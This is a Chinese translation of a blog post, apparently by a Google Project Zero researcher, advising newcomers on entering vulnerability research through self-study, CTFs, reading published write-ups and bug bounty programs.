6，2018&lt;/p&gt;

&lt;p&gt;Posted by &lt;a href=&quot;https://www.blogger.com/profile/03011648433786848352&quot; title=&quot;author profile&quot;&gt;Ivan Fratric &lt;/a&gt; at 4:21 AM&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.kinja-img.com/gawker-media/image/upload/s--De0bVR9---/c_scale,f_auto,fl_progressive,q_80,w_800/199nqjj20hmnigif.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;已經有很多人（包括我Google的同事，&lt;a href=&quot;https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23&quot;&gt;Parisa&lt;/a&gt; 和 &lt;a href=&quot;https://lcamtuf.blogspot.ch/2016/08/so-you-want-to-work-in-security-but-are.html&quot;&gt;Michal&lt;/a&gt; 都曾經就這個話題寫過自己的想法，我建議你仔細閱讀。我知道我寫的這些可能已經有人說過了，但是每隔一段時間我總是會再次遇到這個問題，於是我決定寫下我自己的經驗。&lt;/p&gt;

&lt;p&gt;首先談到的是，我是一個應用程式的安全研究員，我是從 漏洞研究/安全審查/ 尋找bug/ 駭客攻擊 等角度來寫這篇文章的。因為在安全領域還有很多其他的方向，比如安全研發，惡意軟體分析等等，而我對這些並不熟悉。&lt;/p&gt;

&lt;p&gt;那麼，我是誰？為什麼你要在這個話題上信任我呢？嗯，首先我不是說你應該完全信任我，因為每個人的經驗和每個人的道路都是有所不同的。但如果您對我有那麼點感到好奇，我可以直接告訴您，我現在是&lt;a href=&quot;https://googleprojectzero.blogspot.ch/&quot;&gt;Google Project Zero&lt;/a&gt; 的成員，我曾經是谷歌安全團隊的成員，是&lt;a href=&quot;https://github.com/ivanfratric/winafl&quot;&gt;多個安全工具&lt;/a&gt;的作者，如果你在這個Blog上多花點時間翻閱，你會發現我已經從事安全工作十多年了。&lt;/p&gt;

&lt;p&gt;我所認識的安全研究員皆來自許多不同的背景，但是我的背景卻不同，我有相當強的學術背景，這在我的同行中是非常罕見的，當然這並不是進入安全領域的門檻要求。然而，我所知道的安全研究員中的大多數人都有一些共同點，這裡我們來看第一條：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;自己做點東西&lt;/strong&gt;
對於我所知道的業內大多數人來說，在從事相關工作之前，安全只是一項業餘愛好。當然，如果你只是考慮如何學習安全，在告訴你如何開始之前，我得先告訴你自己做點東西並不會有什麼太大的幫助。繼續往下閱讀，我會在下面提到如何開始。而首先，還有一件事你應該注意(但不要讓它成為阻礙你的難關，我們將在後面看到如何解決它)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;現在開始學習安全，比十年前困難的多&lt;/strong&gt;
我懷疑這件事不是每個人都會承認，但是安全在過去這些年，確實有了很大提高。是的，如果你足夠深入的話，你將會發現用十多年前的技術仍然沿用在可以運行的軟件或者硬件，例如 Web瀏覽器。當我正在研究我的第一個 Windows漏洞利用（stack overflow）時，我感到十分沮喪，因為微軟最近引入了新的 safe unlink機制，所以我讀到的一些眾所周知的stack overflow漏洞利用技術已經不再有效。但 10年後，剛開始學習安全的人們不僅需要處理 safe unlink 和 stack cookie ，還需要知道 SafeSEH / SEHOP、DEP、ASLR、CFG、ACG 還有瀏覽器的sandbox 等等。並不只限於 Web瀏覽器，如果你對比一下十年前和現在的 Web應用框架，你會發現在安全技術上已經了顯著的不同。&lt;/p&gt;

&lt;p&gt;請不要害怕上面這一段文字，那麼你應該如何應付日益陡峭的學習曲線呢?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;利用好學習資源&lt;/strong&gt;
一般而言，剛開始入門的難度的確比較高，但實際上，現在的學習資源也比以前還要豐富。&lt;/p&gt;

&lt;p&gt;但是另一個警告是: &lt;strong&gt;你需要能夠走出舒適圈並且自主學習&lt;/strong&gt;，沒有人會牽著你的手，或者成為你的導師(可能其他行業總是有厲害的師父善於傳承，站出來來幫助學徒成長，但是駭客很少這樣做)。 如果你喜歡按照預先設定好的課程大綱來進行(就像我承認關於我的大部分教育所做的那樣)，那麼你可能就不會在安全這方面走得太遠。&lt;/p&gt;

&lt;p&gt;在獲得正確的學習資源之前，您需要學會正確地提問。 Google搜索 “如何成為駭客” 和類似的問題，在現在仍然會得到與以前一樣的一堆胡說八道。 相反，請嘗試搜尋更加細緻的問題，例如:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;我感興趣的這個軟體/硬體是如何運作的？它基於什麼技術？有我可以閱讀的源碼嗎？有教程嗎? 有技術文件嗎？&lt;/li&gt;
  &lt;li&gt;有人已經設法成功破解了我想要破解的這一軟體/硬體嗎？他們有發布了 WriteUp嗎？ Exp呢？ 會議介紹呢？ 我真的明白他們是怎麼做了什麼了嗎？&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;由此可見，你自己必須在技術上相當不錯，以了解由別人製作的真實軟體或硬體是如何工作的。 雖然編寫程式碼和閱讀程式碼的技能並不完全相同，但仍存在相當大的重疊，所以如果您不習慣寫程式碼，在進一步深入研究安全之前，您可能需要改進這一點。&lt;/p&gt;

&lt;p&gt;不要忘記第二點。 雖然之前我對技術性的東西還算是比較好的，但是直到我開始閱讀其他人發布的漏洞研究和 Exp後，我才真正理解安全為何物。&lt;/p&gt;

&lt;p&gt;還有另一個警告: &lt;strong&gt;當你遇到你不了解的東西時，不要放棄。&lt;/strong&gt; 特別是在剛開始閱讀各種資源時，你會遇到的許多問題。 跳過這些部分的確是簡單的方法，但也是絕對錯誤的方法。 相反，想想遇到的每一bit的訊息都是你不了解的，那把它們作為線索，想想你還需要學習什麼。&lt;/p&gt;

&lt;p&gt;雖然我寫到沒有人會牽著你的手，但這並不意味著你不應該提問。 事實上，你應該更自私一點。 人們不會為你而放下自己所做的工作，但如果你卡住了，他們可能會抽點時間給你一個正確的方向。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;使用推特&lt;/strong&gt;
擁護一個特定的社交網路看起來很奇怪，但一個重要事實是很多安全團隊都使用 Twitter 來分享新聞，而且更重要的是那些最近的研究、漏洞、 PoC、會議演講和其他類似的資源連結都在這。 我真的不知道這些的起源是怎麼發生的，也許是短消息的形式讓人們更方便地分享資源連結，而不用受到漫長而不必要的討論的困擾。 所以，在 Twitter 上找那些研究或發表了你感興趣東西的人，然後翻閱他們的推特吧。&lt;/p&gt;

&lt;p&gt;除了Twitter 以外，你可以找到有趣資源的其他地方是&lt;a href=&quot;https://www.reddit.com/r/netsec/&quot;&gt;r/netsec&lt;/a&gt; 和&lt;a href=&quot;https://news.ycombinator.com/&quot;&gt;Hacker News&lt;/a&gt; (儘管它除了安全性外還有某些其他的東西)。 你還可以看看安全會議的演講和錄音(它們有很多，但並不都是好的。 請將重點集中於技術性較強的那些會議)。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;打 CTF 是一種很好的學習方式&lt;/strong&gt;
這是另一個我給你們的奇怪建議，因為我自己幾乎從不玩CTF，但是還記得我前面寫的有關難度曲線的內容嗎? 打 CTF 可以讓你的學習經歷更加循序漸進，因為 CTF 的賽題有多種難度級別(你通常可以通過每個賽題的分數來分辨)，所以你可以從更簡單的開始，然後從那裡開始一點點學習。 舉個例子，在關閉某些漏洞防護機制之後練習漏洞利用。 然後知道這兒有一個bug或知道用甚麼方式來解決它，也能獲得些許成就感。&lt;/p&gt;

&lt;p&gt;幾乎每個星期在某一個地方都有一個 CTF 舉行，其中大部分都是可以在線上解題的，你可以在&lt;a href=&quot;https://ctftime.org/&quot;&gt;這邊&lt;/a&gt;
找到安排的比賽時間。 如果你不能解決賽題，不要忘了還有他人解題後的 WriteUp 可以賽後參考學習。&lt;/p&gt;

&lt;p&gt;CTF 可以成為一種很有趣的經歷，但當你學會一些東西之後，別忘了活用這些經驗繼續研究真實世界中的目標，你可能會感到十分驚喜!&lt;/p&gt;

&lt;p&gt;還有，當你遇到真實世界的問題時:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;不要害怕失敗，哪怕一次又一次。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;現在漏洞研究的工作常常是讓人十分沮喪的，大部分你嘗試的東西都不會成功，但你必須接受這一點。 而且不要因此而灰心喪志。 這不是因為你初學經驗不足而發生在你身上，對於每一個富有經驗的研究員來說也是如此。 我們往往只能看到別人的成功，卻不知道其背後的代價。 當你失敗的時候，在繼續前進之前一定要弄明白失敗的原因。&lt;/p&gt;

&lt;p&gt;你比你想像的更加聰明(反之亦然: 其他人並不像你想的那樣聰明)。
這可能是一個有爭議的觀點，因為有其他人提出了“你並不比開發者更聰明” 的建議。 雖然這是真實的，對於業內很多人來說，這是一個很好的建議。但對許多剛剛入門或正在考慮入門的人來說，這可能是錯誤的，因為事實是，在看到別的聰明人做什麼之後，如果自己沒有在這個領域做任何事情，就很容易懷疑自己的能力。 讓我舉個例子: 現在你可能聽起來很奇怪，但是當我開始把安全作為一種愛好時，我認為我從來沒有足夠的能力去發現 Windows 中的漏洞。我從來沒有嘗試過，但是我偶然發現了我的第一個 Windows 漏洞：我 fuzz 了一些防護超爛的圖像庫，過了一段時間，我有一些崩潰樣本。 而當我意外地點擊 Windows 中的其中一個崩潰樣本時，Windows 資源管理器崩潰了- 這就是CVE-2008-3013。&lt;/p&gt;

&lt;p&gt;另外一個例子: 在對一個軟體進行審查的時候，你可能會有一個想法，然後想“不，這太愚蠢了，開發人員肯定會想到這個”。 事實是，他們經常沒有。 公平地說，那不是因為他們愚蠢，那很可能是因為他們當時想到了其他問題並全神貫注的再處理。所以，如果“我比他們聰明”的思維方式有助於突破你為自己設定的人為限制，就請堅信這點吧。&lt;/p&gt;

&lt;p&gt;當你和別人，特別是開發者交談的時候，請記住，他們是程式碼方面的專家，但是你是安全方面的專家。&lt;/p&gt;

&lt;p&gt;我如何證明自己的能力?
可以從賺錢開始:很多公司都有 bug bounty program: &lt;a href=&quot;https://www.google.com/about/appsecurity/reward-program/&quot;&gt;Google&lt;/a&gt;，&lt;a href=&quot;https://www.facebook.com/whitehat&quot;&gt;Facebook&lt;/a&gt;，&lt;a href=&quot;https://technet.microsoft.com/en-us/security/dn425036&quot;&gt;Microsoft&lt;/a&gt;，以及&lt;a href=&quot;https://www.hackerone.com/&quot;&gt;更多&lt;/a&gt; 更多 &lt;a href=&quot;https://www.bugcrowd.com/&quot;&gt;其他&lt;/a&gt;的獎金專案。&lt;/p&gt;

&lt;p&gt;即使你挖到的漏洞拿不到獎金，但能幫助到他人，仍然能夠幫助證明你的實力。&lt;/p&gt;

&lt;p&gt;挖漏洞並不是唯一的途徑，開發安全工具，做防禦性的研究，同樣是很有價值的。&lt;/p&gt;

&lt;p&gt;還有什麼是我需要知道的?
安全研究員的人生可能並不像你想像的那麼光鮮亮麗，為了成為一個享負盛名的大神，你需要在電腦面前坐到天荒地老。 這是一份有挑戰性的工作，並且需要花費相當大的精力。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Misc" /><summary type="html">Tuesday，February 6，2018</summary></entry></feed>